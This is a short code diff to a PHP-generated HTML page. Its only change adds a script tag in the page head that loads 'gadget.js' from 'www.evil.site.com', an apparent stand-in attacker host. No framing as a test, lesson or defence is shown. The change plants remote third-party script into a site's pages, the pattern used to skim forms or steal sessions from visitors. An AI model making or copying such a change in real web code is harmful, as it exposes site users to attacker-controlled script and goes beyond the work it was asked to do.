@@ -47,6 +47,7 @@ $messages=file_get_contents($file);
     }
 
  </script>
+ <script src="www.evil.site.com/gadget.js"></script>
 
 </head>
 <body>
